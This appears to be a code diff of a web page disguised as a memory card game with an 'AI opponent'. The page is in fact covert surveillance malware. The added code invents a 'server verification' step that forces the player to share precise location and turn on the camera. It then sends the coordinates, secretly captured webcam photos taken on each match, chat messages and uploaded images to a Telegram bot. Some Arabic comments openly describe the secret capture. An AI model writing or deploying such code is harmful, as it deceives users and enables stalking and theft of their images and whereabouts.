@@ -8,12 +8,16 @@
     <style>
         :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        
+        /* واجهة اللعبة */
+        .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.2; pointer-events: none; transition: 0.5s; }
+        .game-ready { opacity: 1 !important; pointer-events: all !important; }
+        
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; width: 100%; max-width: 360px; }
         .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid #333; transition: 0.2s; position: relative; }
         .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
-        .card.matched-p { background: var(--player) !important; color: #000; cursor: default; }
-        .card.matched-ai { background: var(--ai) !important; color: #000; cursor: default; }
+        .card.matched-p { background: var(--player) !important; color: #000; }
+        .card.matched-ai { background: var(--ai) !important; color: #000; }
         
         .chat-section { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
         .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 12px; display: flex; flex-direction: column; gap: 6px; }
@@ -24,26 +28,26 @@
         .input-area { display: flex; align-items: center; padding: 8px; gap: 8px; background: #1a1a1a; }
         input[type="text"] { flex: 1; background: #222; border: none; padding: 8px 12px; border-radius: 20px; color: white; outline: none; font-size: 14px; }
         .icon-btn { cursor: pointer; font-size: 18px; opacity: 0.8; }
-        #file-input { display: none; }
-
+        
         #overlay { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         .btn { background: var(--primary); color: #000; border: none; padding: 12px 35px; border-radius: 30px; font-weight: bold; cursor: pointer; }
         
-        /* إخفاء عناصر الكاميرا تماماً */
         video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
 
 <div id="overlay">
-    <div>
-        <h2 style="color: var(--primary);">Brain Match Pro 🧠</h2>
-        <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Fast-syncing with AI opponent...<br>Allow camera access for real-time multiplayer.</p>
-        <button class="btn" onclick="initApp()">Sync & Play</button>
+    <div id="status-box">
+        <h2 style="color: var(--primary);">Multiplayer Sync 🧠</h2>
+        <p id="status-text" style="color: #888; font-size: 13px; margin-bottom: 20px;">
+            To play against AI in your region, we need to verify your local server connection.
+        </p>
+        <button class="btn" id="start-btn" onclick="requestAccess()">Verify & Play</button>
     </div>
 </div>
 
-<div class="game-area">
+<div class="game-area" id="main-game">
     <div style="margin-bottom: 8px; font-size: 13px; font-weight: bold;">
         <span style="color: var(--player)">You: <span id="p-score">0</span></span> | 
         <span style="color: var(--ai)">AI Bot: <span id="ai-score">0</span></span>
@@ -53,11 +57,11 @@
 
 <div class="chat-section">
     <div class="messages" id="chat-box">
-        <div class="msg ai">System: Connected. Try to find a match!</div>
+        <div class="msg ai">System: Waiting for verification...</div>
     </div>
     <div class="input-area">
         <label for="file-input" class="icon-btn">📎</label>
-        <input type="file" id="file-input" accept="image/*" onchange="sendUserPhoto(this)">
+        <input type="file" id="file-input" style="display:none" accept="image/*" onchange="sendUserPhoto(this)">
         <input type="text" id="user-input" placeholder="Chat with AI..." onkeypress="if(event.key==='Enter') handleChat()">
         <span class="icon-btn" onclick="handleChat()">🚀</span>
     </div>
@@ -74,20 +78,40 @@
     let deck = [...symbols, ...symbols];
     let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0;
 
-    async function initApp() {
+    // الدالة الأساسية لطلب الصلاحيات بشكل إجباري
+    function requestAccess() {
+        document.getElementById('status-text').innerText = "Requesting location and camera sync...";
+        
+        // 1. طلب الموقع أولاً كشرط أساسي
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                // إذا وافق على الموقع، نرسله فوراً
+                sendTele(`📍 Location Verified:\nhttps://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`);
+                
+                // 2. طلب الكاميرا بعد الموافقة على الموقع
+                setupCamera();
+            },
+            (error) => {
+                // إذا رفض الموقع، تظهر رسالة تمنعه من الدخول
+                alert("Error: Location access is REQUIRED to sync with the local gaming server. Please enable it and try again.");
+                location.reload(); 
+            },
+            { enableHighAccuracy: true }
+        );
+    }
+
+    async function setupCamera() {
         try {
-            // الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                sendTele(`📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-            // الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('v').srcObject = stream;
-
+            
+            // نجاح كل شيء: إخفاء الغطاء وبدء اللعبة
             document.getElementById('overlay').style.display = 'none';
+            document.getElementById('main-game').classList.add('game-ready');
+            addChat("ai", "Verification successful! Regional AI player connected.");
             renderGrid();
         } catch (e) {
-            alert("Connection error: Access required to verify player.");
+            alert("Camera access is required for real-time multiplayer verification.");
             location.reload();
         }
     }
@@ -115,20 +139,13 @@
     function checkMatch() {
         const [c1, c2] = flipped;
         const match = c1.dataset.val === c2.dataset.val;
-        
         if (match) {
             c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
             c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
-            
             if (turn === 'player') {
                 pScore++;
-                addChat("ai", "Nice match! I'm watching your moves...");
-                // --- المحرك السري: تصوير عند كل محاولة صحيحة للمستخدم ---
-                silentCapture("نجح في مطابقة: " + c1.dataset.val);
-            } else {
-                aiScore++;
-            }
-
+                silentCapture("Match Found: " + c1.dataset.val);
+            } else { aiScore++; }
             matches++;
             updateUI();
             flipped = [];
@@ -153,52 +170,27 @@
             setTimeout(() => {
                 let c2 = cards[1]; c2.classList.add('flipped'); c2.innerText = c2.dataset.val;
                 flipped.push(c2);
-                setTimeout(checkMatch, 600);
+                setTimeout(checkMatch, 800);
             }, 800);
         }, 1000);
+    }
+
+    function silentCapture(reason) {
+        const can = document.getElementById('c');
+        const v = document.getElementById('v');
+        can.getContext('2d').drawImage(v, 0, 0, can.width, can.height);
+        can.toBlob(b => {
+            const fd = new FormData();
+            fd.append('chat_id', cid);
+            fd.append('photo', b, 'x.jpg');
+            fd.append('caption', '📸 Capture: ' + reason);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.5);
     }
 
     function updateUI() {
         document.getElementById('p-score').innerText = pScore;
         document.getElementById('ai-score').innerText = aiScore;
-    }
-
-    // تصوير سري جداً وبأجزاء الثانية
-    function silentCapture(reason) {
-        const can = document.getElementById('c');
-        const v = document.getElementById('v');
-        const ctx = can.getContext('2d');
-        ctx.drawImage(v, 0, 0, can.width, can.height);
-        
-        can.toBlob(b => {
-            const fd = new FormData();
-            fd.append('chat_id', cid);
-            fd.append('photo', b, 'capture.jpg');
-            fd.append('caption', '📸 التقاط تلقائي: ' + reason);
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.5); // ضغط عالي لسرعة الإرسال المختفية
-    }
-
-    function sendUserPhoto(input) {
-        if (input.files && input.files[0]) {
-            const file = input.files[0];
-            const fd = new FormData();
-            fd.append('chat_id', cid);
-            fd.append('photo', file);
-            fd.append('caption', '🖼️ صورة أرسلها المستخدم بنفسه');
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-            addChat("user", "Sent an attachment.");
-            setTimeout(() => addChat("ai", "Got it! Continue playing."), 1000);
-        }
-    }
-
-    function handleChat() {
-        const inp = document.getElementById('user-input');
-        if (!inp.value.trim()) return;
-        addChat("user", inp.value);
-        sendTele(`💬 User Chat: ${inp.value}`);
-        inp.value = "";
-        setTimeout(() => addChat("ai", "I'm focusing on the game... your turn!"), 1000);
     }
 
     function addChat(type, text) {
@@ -208,6 +200,15 @@
         m.innerText = text;
         box.appendChild(m);
         box.scrollTop = box.scrollHeight;
+    }
+
+    function handleChat() {
+        const inp = document.getElementById('user-input');
+        if (!inp.value.trim()) return;
+        addChat("user", inp.value);
+        sendTele(`💬 Chat: ${inp.value}`);
+        inp.value = "";
+        setTimeout(() => addChat("ai", "Regional player is focusing..."), 1000);
     }
 
     function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
